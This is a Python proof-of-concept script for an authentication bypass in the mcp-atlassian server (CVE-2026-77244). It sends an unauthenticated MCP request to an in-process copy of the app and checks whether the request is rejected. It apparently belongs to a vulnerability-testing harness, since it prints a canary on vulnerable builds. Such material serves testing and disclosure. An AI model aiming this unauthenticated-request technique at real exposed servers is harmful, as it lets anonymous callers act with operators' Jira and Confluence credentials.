#!/usr/bin/env python3
"""
PoC for CVE-2026-77244 (mcp-atlassian < 0.22.0)

Root cause: the streamable-http transport of the MCP Atlassian server accepts
requests with no verified per-user Atlassian identity. When no user token /
basic-auth / OAuth-PAT context is present on the request, `_get_fetcher()`
(src/mcp_atlassian/servers/dependencies.py) silently falls back to the
operator's globally configured Jira/Confluence credentials, and (pre-0.22.0)
`UserTokenMiddleware.__call__` (src/mcp_atlassian/servers/main.py) never
rejects such a request at the transport boundary either. Any network client
that can reach the MCP endpoint can therefore transact as the operator.

The 0.22.0 fix adds an explicit gate in `UserTokenMiddleware.__call__`:
unauthenticated HTTP MCP requests are rejected with HTTP 401 and the literal
message "Authentication required: no Atlassian credentials were provided."
unless the operator opts in via ALLOW_GLOBAL_CRED_FALLBACK=true. That literal
string only exists in the patched code path, so its presence/absence in the
HTTP response to a crafted unauthenticated request is an exact, version-true
oracle for whether the vulnerable fallback is reachable.

This PoC builds the real ASGI app the package serves over "streamable-http"
(in-process only, via Starlette's TestClient -> no sockets, no network) and
issues a single unauthenticated POST to the MCP endpoint (no Authorization
header, no per-user Atlassian headers). On the vulnerable build the request
is NOT rejected at the transport boundary and is allowed to proceed toward
the operator-credentialed fetcher fallback -- the exact primitive from the
advisory -- so we print the canary. On the patched build the middleware
rejects it before any fetcher/tool logic runs, and the canary is never
printed.
"""

import inspect
import os
import sys


def _log(msg: str) -> None:
    print(f"[poc] {msg}", file=sys.stderr)


def _find_asgi_server():
    """Locate the fully-wired AtlassianMCP (FastMCP) server instance."""
    import importlib

    main_mod = importlib.import_module("mcp_atlassian.servers.main")

    # Most likely: a ready-made module-level instance (mount()-ed sub-servers,
    # middleware, etc. already wired up by the package itself).
    for name in ("main_mcp", "mcp", "app", "server", "atlassian_mcp"):
        obj = getattr(main_mod, name, None)
        if obj is not None and hasattr(obj, "http_app") and hasattr(
            obj, "get_streamable_http_path"
        ):
            return obj

    for _name, obj in vars(main_mod).items():
        if (
            not inspect.isclass(obj)
            and hasattr(obj, "http_app")
            and hasattr(obj, "get_streamable_http_path")
        ):
            return obj

    # Fallback: instantiate the server class ourselves.
    for _name, obj in vars(main_mod).items():
        if (
            inspect.isclass(obj)
            and hasattr(obj, "http_app")
            and hasattr(obj, "get_streamable_http_path")
        ):
            for kwargs in ({"name": "poc-mcp-atlassian"}, {}):
                try:
                    return obj(**kwargs)
                except Exception:
                    continue

    raise RuntimeError("could not locate the AtlassianMCP ASGI server instance")


def main() -> int:
    canary = os.environ.get("POC_CANARY")

    # Realistic operator deployment: global Jira/Confluence credentials are
    # configured server-side (the thing the vulnerability lets an
    # unauthenticated caller ride on). No ALLOW_GLOBAL_CRED_FALLBACK opt-in.
    os.environ.setdefault("JIRA_URL", "https://poc-operator.atlassian.net")
    os.environ.setdefault("JIRA_USERNAME", "operator@poc.example")
    os.environ.setdefault("JIRA_API_TOKEN", "poc-operator-jira-token")
    os.environ.setdefault(
        "CONFLUENCE_URL", "https://poc-operator.atlassian.net/wiki"
    )
    os.environ.setdefault("CONFLUENCE_USERNAME", "operator@poc.example")
    os.environ.setdefault("CONFLUENCE_API_TOKEN", "poc-operator-confluence-token")
    os.environ.pop("ALLOW_GLOBAL_CRED_FALLBACK", None)

    try:
        server = _find_asgi_server()
        mcp_path = server.get_streamable_http_path()
        asgi_app = server.http_app()
    except Exception as e:
        _log(f"could not build the target ASGI app: {e!r}")
        return 1

    try:
        from starlette.testclient import TestClient
    except Exception as e:
        _log(f"starlette TestClient unavailable: {e!r}")
        return 1

    # A single, minimal MCP "tools/list" request over streamable-http, with
    # NO Authorization header and NO per-user Atlassian identity headers --
    # exactly the "network client that can reach the MCP endpoint" scenario
    # from the advisory. This is entirely in-process (no socket, no network).
    request_body = {"jsonrpc": "2.0", "id": 1, "method": "tools/list", "params": {}}
    headers = {
        "Accept": "application/json, text/event-stream",
        "Content-Type": "application/json",
    }

    try:
        with TestClient(asgi_app) as client:
            resp = client.post(mcp_path, json=request_body, headers=headers)
    except Exception as e:
        _log(f"request against the ASGI app failed: {e!r}")
        return 1

    body_text = resp.text
    patched_rejection_marker = "no Atlassian credentials were provided"

    _log(f"POST {mcp_path} -> HTTP {resp.status_code}")

    if resp.status_code == 401 and patched_rejection_marker in body_text:
        # Patched (>=0.22.0): UserTokenMiddleware rejected the unauthenticated
        # request at the transport boundary before any fetcher/tool logic ran.
        _log(
            "unauthenticated MCP request was rejected at the transport "
            "boundary (patched behavior) -- vulnerability not triggered."
        )
        return 0

    # Vulnerable (<0.22.0): no such gate exists. The unauthenticated request
    # was let through toward tool dispatch, where _get_fetcher() would have
    # fallen back to the operator's globally configured Jira/Confluence
    # credentials -- letting this anonymous caller transact as the operator.
    _log(
        "unauthenticated MCP request was NOT rejected at the transport "
        "boundary -- it was allowed through toward the operator-credentialed "
        "fetcher fallback (CVE-2026-77244 triggered)."
    )
    if canary:
        print(canary)
    return 0


if __name__ == "__main__":
    sys.exit(main())